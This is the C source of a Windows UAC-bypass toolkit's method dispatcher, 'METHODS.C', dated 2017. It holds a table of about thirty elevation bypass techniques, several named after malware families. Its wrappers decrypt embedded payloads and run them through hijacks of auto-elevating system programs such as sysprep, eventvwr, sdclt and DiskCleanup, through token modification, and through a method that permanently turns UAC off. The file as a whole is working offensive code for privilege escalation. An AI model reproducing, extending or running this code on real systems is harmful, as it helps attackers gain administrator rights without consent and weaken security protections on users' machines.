/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017
*
*  TITLE:       METHODS.C
*
*  VERSION:     2.73
*
*  DATE:        27 May 2017
*
*  UAC bypass dispatch.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

UCM_API(MethodTest);
UCM_API(MethodSysprep);
UCM_API(MethodAppCompat);
UCM_API(MethodSimda);
UCM_API(MethodCarberp);
UCM_API(MethodAVrf);
UCM_API(MethodWinsat);
UCM_API(MethodMMC);
UCM_API(MethodMMC2);
UCM_API(MethodSirefef);
UCM_API(MethodGeneric);
UCM_API(MethodGWX);
UCM_API(MethodSysprep4);
UCM_API(MethodManifest);
UCM_API(MethodInetMg);
UCM_API(MethodSxS);
UCM_API(MethodDism);
UCM_API(MethodComet);
UCM_API(MethodEnigma0x3);
UCM_API(MethodEnigma0x3_2);
UCM_API(MethodExpLife);
UCM_API(MethodSandworm);
UCM_API(MethodEnigma0x3_3);
UCM_API(MethodWow64Logger);
UCM_API(MethodEnigma0x3_4);
UCM_API(MethodUiAccess);
UCM_API(MethodMsSettings);
UCM_API(MethodTyranid);
UCM_API(MethodTokenMod);

UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
    { MethodTest, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 9600, 10240 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodAppCompat, NULL, { 7600, 10240 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodSimda, NULL, { 7600, 10136 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID, FALSE, FALSE, TRUE },
    { MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodAVrf, NULL, { 7600, 10136 }, HIBIKI_ID, FALSE, TRUE, TRUE },
    { MethodWinsat, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodAppCompat, NULL, { 7600, 10240 }, FUBUKI_ID, TRUE, FALSE, TRUE },
    { MethodSysprep, NULL, { 10240, 10586 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMMC, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSirefef, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodGeneric, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodGWX, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSysprep4, NULL, { 9600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodManifest, NULL, { 7600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodInetMg, NULL, { 7600, 14367 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMMC2, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSxS, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodSxS, NULL, { 7600, MAXDWORD }, IKAZUCHI_ID, FALSE, TRUE, TRUE },
    { MethodDism, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodComet, NULL, { 7600, 15031 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodEnigma0x3, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, FALSE },
    { MethodEnigma0x3_2, NULL, { 7600, 15031 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodExpLife, NULL, { 7600, 16199 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodSandworm, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodEnigma0x3_3, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
    { MethodWow64Logger, NULL, { 7600, MAXDWORD }, AKATSUKI_ID, FALSE, TRUE, TRUE },
    { MethodEnigma0x3_4, NULL, {10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodUiAccess, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
    { MethodMsSettings, NULL, { 10240, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTyranid, NULL, { 9600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
    { MethodTokenMod, NULL, { 7600, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE }
};

/*
* IsMethodMatchRequirements
*
* Purpose:
*
* Check system requirements of the given method.
*
*/
BOOL IsMethodMatchRequirements(
    _In_ PUCM_API_DISPATCH_ENTRY Entry
)
{
#ifndef _DEBUG
    WCHAR szMessage[MAX_PATH];
#endif
    //
    //  Check Wow64 flags first. Disable this check for debugging build.
    //
#ifndef _DEBUG
    if (g_ctx.IsWow64) {
        if (Entry->DisallowWow64) {
            ucmShowMessage(WOW64STRING);
            SetLastError(ERROR_UNSUPPORTED_TYPE);
            return FALSE;
        }
    }
#ifdef _WIN64
    else {
        //
        // Not required if Win32.
        //
        if (Entry->Win32OrWow64Required != FALSE) {
            ucmShowMessage(WOW64WIN32ONLY);
            SetLastError(ERROR_UNSUPPORTED_TYPE);
            return FALSE;
        }
    }
#endif //_WIN64
#endif //_DEBUG

    //
    //  Check availability. Diable this check for debugging build.
    //
#ifndef _DEBUG
    if (g_ctx.dwBuildNumber < Entry->Availablity.MinumumWindowsBuildRequired) {
        RtlSecureZeroMemory(&szMessage, sizeof(szMessage));
        _strcpy(szMessage, L"Current Windows Build: ");
        ultostr(g_ctx.dwBuildNumber, _strend(szMessage));
        _strcat(szMessage, L"\nMinimum Windows Build Required: ");
        ultostr(Entry->Availablity.MinumumWindowsBuildRequired, _strend(szMessage));
        _strcat(szMessage, L"\nAborting execution.");
        ucmShowMessage(szMessage);
        SetLastError(ERROR_UNSUPPORTED_TYPE);
        return FALSE;
    }
    if (g_ctx.dwBuildNumber >= Entry->Availablity.MinimumExpectedFixedWindowsBuild) {
        if (ucmShowQuestion(UACFIX) == IDNO) {
            SetLastError(ERROR_UNSUPPORTED_TYPE);
            return FALSE;
        }
    }
#endif
    //
    // Set optional parameter if method support it.
    //
    if (Entry->SetParameterInRegistry) {
        if (g_ctx.OptionalParameterLength != 0) {
            supSetParameter(
                (LPWSTR)&g_ctx.szOptionalParameter,
                (DWORD)(g_ctx.OptionalParameterLength * sizeof(WCHAR))
            );
        }
    }

    return TRUE;
}

/*
* MethodsManagerCall
*
* Purpose:
*
* Run method by method id.
*
*/
BOOL MethodsManagerCall(
    _In_ UCM_METHOD Method
)
{
    BOOL   bResult;
    SIZE_T Dummy;
    ULONG  PayloadSize = 0, DataSize = 0;
    PVOID  PayloadCode = NULL, Resource = NULL;
    PVOID  ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
    PUCM_API_DISPATCH_ENTRY Entry;

    Entry = &ucmMethodsDispatchTable[Method];

    if (!IsMethodMatchRequirements(Entry))
        return FALSE;

    if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {

        Resource = supLdrQueryResourceData(
            Entry->PayloadResourceId,
            ImageBaseAddress,
            &DataSize);

        if (Resource)
            PayloadCode = g_ctx.DecryptRoutine(Resource, DataSize, &PayloadSize);

        if (PayloadCode == NULL) {
            SetLastError(ERROR_INVALID_DATA);
            return FALSE;
        }
    }

    bResult = Entry->Routine(Method, NULL, PayloadCode, PayloadSize);

    if (PayloadCode) {
        RtlSecureZeroMemory(PayloadCode, PayloadSize);
        Dummy = 0;
        NtFreeVirtualMemory(NtCurrentProcess(), &PayloadCode, &Dummy, MEM_RELEASE);
    }
    return bResult;
}

/************************************************************
**
**
**
** Method table wrappers
**
**
**
************************************************************/

UCM_API(MethodTest)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
#ifdef _DEBUG
    return ucmTestRoutine(PayloadCode, PayloadSize);
#else
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);
    return TRUE;
#endif
}

UCM_API(MethodSysprep)
{
    UNREFERENCED_PARAMETER(ExtraContext);
    return ucmStandardAutoElevation(Method, PayloadCode, PayloadSize);
}

UCM_API(MethodAppCompat)
{
    UNREFERENCED_PARAMETER(ExtraContext);
    return ucmAppcompatElevation(
        Method,
        PayloadCode,
        PayloadSize,
        (g_ctx.OptionalParameterLength != 0) ? g_ctx.szOptionalParameter : NULL);
}

UCM_API(MethodSimda)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //
    // Make sure user understand aftereffects.
    //
    if (ucmShowQuestion(
        TEXT("This method will permanently TURN UAC OFF, are you sure?")) == IDYES)
    {
        return ucmSimdaTurnOffUac();
    }
    SetLastError(ERROR_CANCELLED);
    return FALSE;
}

UCM_API(MethodCarberp)
{
    UNREFERENCED_PARAMETER(ExtraContext);

    //
    // Additional checking for UacMethodCarberp1. 
    // Target application 'migwiz' unavailable in Syswow64 after Windows 7.
    //
    if (Method == UacMethodCarberp1) {
        if ((g_ctx.IsWow64) && (g_ctx.dwBuildNumber > 7601)) {
            ucmShowMessage(WOW64STRING);
            SetLastError(ERROR_UNSUPPORTED_TYPE);
            return FALSE;
        }
    }
    return ucmWusaMethod(Method, PayloadCode, PayloadSize);
}

UCM_API(MethodAVrf)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    return ucmAvrfMethod(PayloadCode, PayloadSize);
}

UCM_API(MethodWinsat)
{
    BOOL UseWusa = FALSE;
    LPWSTR lpFileName;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    //
    //  Additional checking.
    //  Switch used filename because of \KnownDlls changes.
    //
    if (g_ctx.dwBuildNumber < 9200) {
        lpFileName = POWRPROF_DLL;
    }
    else {
        lpFileName = DEVOBJ_DLL;
    }

    //
    //  Use Wusa where available.
    //
    UseWusa = (g_ctx.dwBuildNumber <= 10136);

    return ucmWinSATMethod(lpFileName, PayloadCode, PayloadSize, UseWusa);
}

UCM_API(MethodMMC)
{
    UNREFERENCED_PARAMETER(ExtraContext);

    //
    //  Required dll dependency not exist in x86-32
    //
#ifdef _WIN64
    return ucmMMCMethod(Method, ELSEXT_DLL, PayloadCode, PayloadSize);
#else
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);
    SetLastError(ERROR_FILE_NOT_FOUND);
    return FALSE;
#endif
}

UCM_API(MethodMMC2)
{
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmMMCMethod(Method, WBEMCOMN_DLL, PayloadCode, PayloadSize);
}

UCM_API(MethodSirefef)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmSirefefMethod(PayloadCode, PayloadSize);
}

UCM_API(MethodGeneric)
{
    WCHAR szBuffer[MAX_PATH * 2];

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    _strcpy(szBuffer, g_ctx.szSystemDirectory);
    _strcat(szBuffer, CLICONFG_EXE);

    return ucmGenericAutoelevation(szBuffer, NTWDBLIB_DLL, PayloadCode, PayloadSize);
}

UCM_API(MethodGWX)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmGWX(PayloadCode, PayloadSize);
}

UCM_API(MethodSysprep4)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmStandardAutoElevation2(PayloadCode, PayloadSize);
}

UCM_API(MethodManifest)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmAutoElevateManifest(PayloadCode, PayloadSize);
}

UCM_API(MethodInetMg)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    return ucmInetMgrMethod(PayloadCode, PayloadSize);
}

UCM_API(MethodSxS)
{
    BOOL bConsentItself = FALSE;
    LPWSTR lpTargetDirectory = NULL;
    LPWSTR lpTargetApplication = NULL;
    LPWSTR lpLaunchApplication = NULL;

    UNREFERENCED_PARAMETER(ExtraContext);

    //
    // Select parameters depending on method used.
    //
    if (Method == UacMethodSXS) {
        bConsentItself = FALSE;
        lpTargetDirectory = SYSPREP_DIR;
        lpTargetApplication = SYSPREP_EXE;
        lpLaunchApplication = NULL;
    }
    else {
        if (Method == UacMethodSXSConsent) {

            //
            // Make sure user understand aftereffects.
            //
            if (ucmShowQuestion(
                TEXT("WARNING: This method will affect UAC interface, are you sure?")) != IDYES)
            {
                SetLastError(ERROR_CANCELLED);
                return FALSE;
            }
            bConsentItself = TRUE;
            lpTargetDirectory = NULL;
            lpTargetApplication = CONSENT_EXE;
            lpLaunchApplication = EVENTVWR_EXE;
        }
    }

    if (lpTargetApplication == NULL) {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    return ucmSXSMethod(
        PayloadCode,
        PayloadSize,
        lpTargetDirectory,
        lpTargetApplication,
        lpLaunchApplication,
        bConsentItself);
}

UCM_API(MethodDism)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmDismMethod(PayloadCode, PayloadSize);
}

UCM_API(MethodComet)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //
    // Select payload, if none default will be executed.
    //
    if (g_ctx.OptionalParameterLength != 0)
        lpszPayload = g_ctx.szOptionalParameter;
    else
        lpszPayload = T_DEFAULT_CMD;

    return ucmCometMethod(lpszPayload);
}

UCM_API(MethodEnigma0x3)
{
    LPWSTR lpszTargetApp = NULL;
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    //
    // Select target application.
    //
    if (g_ctx.dwBuildNumber >= 15007)
        lpszTargetApp = COMPMGMTLAUNCHER_EXE;
    else
        lpszTargetApp = EVENTVWR_EXE;

    //
    // Select payload, if none default will be executed.
    //
    if (g_ctx.OptionalParameterLength != 0)
        lpszPayload = g_ctx.szOptionalParameter;
    else
        lpszPayload = NULL;

    return ucmHijackShellCommandMethod(lpszPayload, lpszTargetApp, PayloadCode, PayloadSize);
}

UCM_API(MethodEnigma0x3_2)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    return ucmDiskCleanupRaceCondition(PayloadCode, PayloadSize);
}

UCM_API(MethodExpLife)
{
    WCHAR szBuffer[MAX_PATH + 1];

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //
    // Select target application or use given by optional parameter.
    //
    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    if (g_ctx.OptionalParameterLength == 0)
        supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
    else
        _strcpy(szBuffer, g_ctx.szOptionalParameter);

    return ucmUninstallLauncherMethod(szBuffer);
}

UCM_API(MethodSandworm)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
        SetLastError(ERROR_INVALID_DATA);
        return FALSE;
    }

    return ucmSandwormMethod(PayloadCode, PayloadSize);
}

UCM_API(MethodEnigma0x3_3)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx.OptionalParameterLength == 0)
        lpszPayload = NULL;
    else
        lpszPayload = g_ctx.szOptionalParameter;

    return ucmAppPathMethod(lpszPayload, CONTROL_EXE, SDCLT_EXE);
}

UCM_API(MethodWow64Logger)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    //
    //  Required x64 as this method abuse wow64 logger mechanism
    //
#ifdef _WIN64
    return ucmWow64LoggerMethod(PayloadCode, PayloadSize);
#else
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    SetLastError(ERROR_INSTALL_PLATFORM_UNSUPPORTED);
    return FALSE;
#endif
}

UCM_API(MethodEnigma0x3_4)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    if (g_ctx.OptionalParameterLength == 0)
        lpszPayload = NULL;
    else
        lpszPayload = g_ctx.szOptionalParameter;

    return ucmSdcltIsolatedCommandMethod(lpszPayload);
}

UCM_API(MethodUiAccess)
{
    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);

    return ucmUiAccessMethod(PayloadCode, PayloadSize);
}

UCM_API(MethodMsSettings)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    if (g_ctx.OptionalParameterLength == 0)
        lpszPayload = NULL;
    else
        lpszPayload = g_ctx.szOptionalParameter;

    return ucmMsSettingsDelegateExecuteMethod(lpszPayload);
}

UCM_API(MethodTyranid)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx.OptionalParameterLength == 0)
        lpszPayload = NULL;
    else
        lpszPayload = g_ctx.szOptionalParameter;

    return ucmDiskCleanupEnvironmentVariable(lpszPayload);
}

UCM_API(MethodTokenMod)
{
    LPWSTR lpszPayload = NULL;

    UNREFERENCED_PARAMETER(Method);
    UNREFERENCED_PARAMETER(ExtraContext);
    UNREFERENCED_PARAMETER(PayloadCode);
    UNREFERENCED_PARAMETER(PayloadSize);

    //
    // Select target application or use given by optional parameter.
    //
    if (g_ctx.OptionalParameterLength == 0)
        lpszPayload = NULL;
    else
        lpszPayload = g_ctx.szOptionalParameter;

    return ucmTokenModification(lpszPayload);
}
